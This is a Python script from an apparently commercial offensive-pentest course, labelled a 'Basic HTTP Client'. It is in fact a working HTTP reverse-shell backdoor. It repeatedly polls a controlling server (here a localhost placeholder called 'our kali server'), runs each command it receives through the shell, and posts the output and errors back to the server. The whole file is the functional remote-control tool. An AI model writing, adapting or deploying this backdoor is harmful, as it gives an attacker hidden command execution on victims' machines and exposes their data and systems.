# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic HTTP Client


import requests # Download Link https://pypi.python.org/pypi/requests#downloads , just extract the rar file and follow the video :)
import subprocess 
import time


while True: 

    req = requests.get('http://127.0.0.1') # Send GET request to our kali server
    command = req.text # Store the received txt into command variable

    if 'terminate' in command:
        break 

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://127.0.0.1', data=CMD.stdout.read() ) # POST the result 
        post_response = requests.post(url='http://127.0.0.1', data=CMD.stderr.read() ) # or the error -if any-

    time.sleep(3)